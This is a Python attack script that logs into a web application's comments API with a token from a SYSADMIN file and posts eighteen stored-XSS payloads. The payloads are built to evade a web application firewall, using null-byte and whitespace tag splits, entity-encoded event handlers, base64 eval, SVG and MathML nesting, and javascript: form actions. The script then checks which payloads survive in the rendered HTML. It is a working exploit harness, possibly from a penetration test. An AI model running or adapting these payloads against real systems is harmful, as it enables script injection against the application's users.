import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXD'+uuid.uuid4().hex[:5]
def post(h):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,"message_raw":h,"message_html":h}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== deep WAF bypass attempts: split tag name / alternate syntax ===")
probes=[
 ('img-split-null',  f'<im\x00g src=x onerror=alert(1)>{tag}'),
 ('img-split-nl',    f'<im\ng src=x onerror=alert(1)>{tag}'),
 ('img-split-tab',   f'<im\tg src=x onerror=alert(1)>{tag}'),
 ('img-slash',       f'<img/src=x onerror=alert(1)>{tag}'),
 ('img-double-slash',f'<img//src=x onerror=alert(1)>{tag}'),
 ('onerror-split',   f'<img src=x on\x00error=alert(1)>{tag}'),
 ('onerror-ent',     f'<img src=x on&#101;rror=alert(1)>{tag}'),
 ('onerror-case',    f'<img src=x OnErRoR=alert(1)>{tag}'),
 ('onerror-nospace', f'<img/src=x/onerror=alert(1)>{tag}'),
 ('alert-ent',       f'<img src=x onerror=&#97;lert(1)>{tag}'),
 ('alert-js-esc',    f'<img src=x onerror=eval(atob("YWxlcnQoMSk="))>{tag}'),
 ('no-parens',       f'<img src=x onerror=alert`1`>{tag}'),
 ('svg-nested',      f'<svg><animate onbegin=alert(1)>{tag}</animate></svg>'),
 ('svg-desc',        f'<svg><desc><img src=x onerror=alert(1)></desc></svg>'),
 ('math-nested',     f'<math><mtext><img src=x onerror=alert(1)></mtext></math>{tag}'),
 ('form-action',     f'<form><button formaction=javascript&colon;alert(1)>{tag}</button></form>'),
 ('isindex',         f'<isindex action=javascript&colon;alert(1) type=image>{tag}'),
 ('input-formact',   f'<input type=image formaction=javascript&colon;alert(1)>{tag}'),
]
for label,h in probes:
    c,b=post(h)
    st=''
    if c in ('200','201'):
        try: st=repr(json.loads(b)['comments'][0].get('message_html'))[:70]
        except: pass
    print(f"  {label:18} {c:>4}  {st}")
